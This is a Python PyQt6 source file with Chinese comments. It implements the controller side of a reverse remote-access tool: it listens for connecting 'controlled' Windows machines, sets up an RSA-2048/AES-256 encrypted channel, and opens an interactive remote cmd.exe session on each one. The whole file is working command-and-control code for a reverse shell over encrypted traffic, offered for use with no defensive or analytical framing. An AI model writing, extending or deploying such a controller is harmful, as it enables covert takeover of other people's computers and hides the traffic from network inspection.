import sys
import socket
import threading
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                             QMenu, QAbstractItemView)
from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot
import struct

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad


def generate_rsa_keypair(bits: int = 2048) -> RSA.RsaKey:
    """生成RSA-2048密钥对，公钥指数e=65537"""
    return RSA.generate(bits, e=65537)


def rsa_pubkey_to_capi_blob(key: RSA.RsaKey) -> bytes:
    """转换为Windows CAPI兼容的PUBLICKEYBLOB格式"""
    # BLOBHEADER (8字节)
    blob_header = struct.pack('<BBHI', 0x06, 0x02, 0x0000, 0x0000A400)
    # RSAPUBKEY (12字节)
    magic = 0x31415352  # 'RSA1' 小端
    bitlen = key.size_in_bits()
    pubexp = key.e
    rsa_pubkey = struct.pack('<III', magic, bitlen, pubexp)
    # Modulus 小端序
    modulus = key.n.to_bytes(bitlen // 8, byteorder='little')
    return blob_header + rsa_pubkey + modulus


class ClientSignals(QObject):
    on_outp = pyqtSignal(object, str)
    on_disconnect = pyqtSignal(object)


class ClientSession:
    def __init__(self, conn: socket.socket, addr):
        self.conn = conn
        self.addr = addr
        self.ip_str = f"{addr[0]}:{addr[1]}"
        self.last_pong = datetime.now()
        self.connected = True
        self._recv_buf = bytearray()
        self.signals = ClientSignals()
        self.aes_key: bytes | None = None

    def send_packet(self, body: bytes) -> bool:
        """AES-256-CBC加密发送"""
        if not self.connected or self.aes_key is None:
            return False
        try:
            iv = get_random_bytes(16)
            cipher = AES.new(self.aes_key, AES.MODE_CBC, iv=iv)
            ciphertext = cipher.encrypt(pad(body, AES.block_size))
            payload = iv + ciphertext
            header = struct.pack('>I', len(payload))
            self.conn.sendall(header + payload)
            return True
        except (OSError, BrokenPipeError, ValueError):
            self.close()
            return False

    def close(self):
        self.connected = False
        self.aes_key = None
        try:
            self.conn.close()
        except Exception:
            pass


class RemoteCmdDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.setWindowTitle(f"远程CMD - {client_session.ip_str}")
        self.resize(680, 450)
        self.client = client_session
        self.is_alive = True

        lay = QVBoxLayout(self)
        self.out_box = QTextEdit()
        self.out_box.setReadOnly(True)
        lay.addWidget(self.out_box)

        input_lay = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("输入命令回车执行")
        self.cmd_input.returnPressed.connect(self.on_enter_command)
        input_lay.addWidget(self.cmd_input)
        lay.addLayout(input_lay)

        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
        self.client.send_packet(b"SPAW")

    @pyqtSlot(str)
    def append_text(self, text: str):
        self.out_box.append(text)

    def on_enter_command(self):
        cmd = self.cmd_input.text().strip()
        self.cmd_input.clear()
        if not self.is_alive or not self.client.connected:
            self.out_box.append("\n[!] 连接断开")
            return
        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
        ok = self.client.send_packet(payload)
        self.out_box.append(f"> {cmd}")
        if not ok:
            self.out_box.append("[发送失败]")

    def closeEvent(self, event):
        self.is_alive = False
        if self.client.connected:
            self.client.send_packet(b"KILL")
        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
            del self.main_window.open_cmd_dialogs[self.client]
        super().closeEvent(event)


class ClientListModel(QAbstractListModel):
    def __init__(self):
        super().__init__()
        self.items: list[ClientSession] = []

    def rowCount(self, parent=QModelIndex()):
        return len(self.items)

    def data(self, index: QModelIndex, role=Qt.ItemDataRole.DisplayRole):
        if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
            return QVariant()
        s = self.items[index.row()]
        return QVariant(f"{s.ip_str} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")

    def add(self, sess: ClientSession):
        self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
        self.items.append(sess)
        self.endInsertRows()

    def remove_by_obj(self, sess: ClientSession):
        idx = self.items.index(sess)
        self.beginRemoveRows(QModelIndex(), idx, idx)
        self.items.pop(idx)
        self.endRemoveRows()


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("TCP反向控制端 (RSA-2048 + AES-256加密)")
        self.resize(700, 500)
        self.server_sock: socket.socket | None = None
        self.server_running = False
        self.server_rsa_key: RSA.RsaKey | None = None
        self.client_model = ClientListModel()
        self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}

        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)

        top_lay = QHBoxLayout()
        top_lay.addWidget(QLabel("监听端口:"))
        self.port_edit = QLineEdit("8888")
        top_lay.addWidget(self.port_edit)
        self.btn_start = QPushButton("启动监听")
        self.btn_start.clicked.connect(self.start_server)
        top_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("停止监听")
        self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False)
        top_lay.addWidget(self.btn_stop)
        lay.addLayout(top_lay)

        self.view = QListView()
        self.view.setModel(self.client_model)
        self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.view.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.view)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        lay.addWidget(self.log_box)

    def log(self, msg):
        self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    def accept_loop(self):
        while self.server_running:
            try:
                conn, addr = self.server_sock.accept()
                sess = ClientSession(conn, addr)
                sess.signals.on_outp.connect(self.handle_session_outp)
                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                self.client_model.add(sess)
                self.log(f"新被控端接入 {sess.ip_str}")
                threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True).start()
            except OSError:
                break

    @pyqtSlot(object, str)
    def handle_session_outp(self, sess: ClientSession, text: str):
        if sess in self.open_cmd_dialogs:
            self.open_cmd_dialogs[sess].append_text(text)

    @pyqtSlot(object)
    def handle_session_disconnect(self, sess: ClientSession):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs.pop(sess)
            dlg.append_text("\n[!] TCP连接已经断开")
        self.client_model.remove_by_obj(sess)
        self.log(f"被控端断开 {sess.ip_str}")

    def client_recv_loop(self, sess: ClientSession):
        buf = sess._recv_buf

        # ========== 密钥交换 ==========
        pub_blob = rsa_pubkey_to_capi_blob(self.server_rsa_key)
        try:
            sess.conn.sendall(pub_blob)
        except OSError:
            sess.close()
            sess.signals.on_disconnect.emit(sess)
            return

        # 接收加密的AES密钥
        encrypted_aes = b''
        while len(encrypted_aes) < 256:
            try:
                chunk = sess.conn.recv(256 - len(encrypted_aes))
                if not chunk:
                    break
                encrypted_aes += chunk
            except OSError:
                break
        if len(encrypted_aes) != 256:
            sess.close()
            sess.signals.on_disconnect.emit(sess)
            return

        # RSA解密得到AES密钥
        cipher_rsa = PKCS1_v1_5.new(self.server_rsa_key)
        aes_key = cipher_rsa.decrypt(encrypted_aes, None)
        if aes_key is None or len(aes_key) != 32:
            sess.close()
            sess.signals.on_disconnect.emit(sess)
            return
        sess.aes_key = aes_key
        self.log(f"与 {sess.ip_str} 完成密钥交换，加密通信已建立")
        # ========== 密钥交换完成 ==========

        # 正常接收解密
        while sess.connected:
            try:
                chunk = sess.conn.recv(4096)
                if not chunk:
                    break
                buf.extend(chunk)

                while len(buf) >= 4:
                    body_len = struct.unpack(">I", buf[0:4])[0]
                    total_packet_len = 4 + body_len
                    if len(buf) < total_packet_len:
                        break

                    body = buf[4:total_packet_len]
                    del buf[:total_packet_len]

                    if len(body) < 16:
                        continue
                    iv = body[:16]
                    ciphertext = body[16:]
                    try:
                        cipher_aes = AES.new(sess.aes_key, AES.MODE_CBC, iv=iv)
                        plaintext = unpad(cipher_aes.decrypt(ciphertext), AES.block_size)
                    except Exception:
                        continue

                    if len(plaintext) >= 4:
                        cmd_code = plaintext[0:4]
                        if cmd_code == b"PONG":
                            sess.last_pong = datetime.now()
                            self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                        elif cmd_code == b"OUTP":
                            output_bytes = plaintext[4:]
                            out_text = output_bytes.decode("gbk", errors="replace")
                            sess.signals.on_outp.emit(sess, out_text)

            except OSError:
                break
        sess.close()
        sess.signals.on_disconnect.emit(sess)

    def start_server(self):
        port = int(self.port_edit.text())
        self.log("正在生成RSA-2048密钥对...")
        self.server_rsa_key = generate_rsa_keypair(2048)
        self.log("RSA密钥对生成完成，采用RSA-2048 + AES-256-CBC加密")

        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind(("0.0.0.0", port))
        self.server_sock.listen(8)
        self.server_running = True
        threading.Thread(target=self.accept_loop, daemon=True).start()
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.log(f"开始监听端口 {port}")

    def stop_server(self):
        self.server_running = False
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
        for s in self.client_model.items:
            s.close()
        self.open_cmd_dialogs.clear()
        self.server_rsa_key = None
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.log("停止监听")

    def on_context_menu(self, pos):
        idx = self.view.indexAt(pos)
        if not idx.isValid():
            return
        sess: ClientSession = self.client_model.items[idx.row()]
        menu = QMenu()
        act_open_cmd = menu.addAction("打开远程CMD会话")
        ret = menu.exec(self.view.viewport().mapToGlobal(pos))
        if ret == act_open_cmd:
            if sess in self.open_cmd_dialogs:
                dlg = self.open_cmd_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_()
                    dlg.activateWindow()
                    return
                else:
                    del self.open_cmd_dialogs[sess]
            dlg = RemoteCmdDialog(sess, parent=self)
            self.open_cmd_dialogs[sess] = dlg
            dlg.show()

    def closeEvent(self, event):
        self.stop_server()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
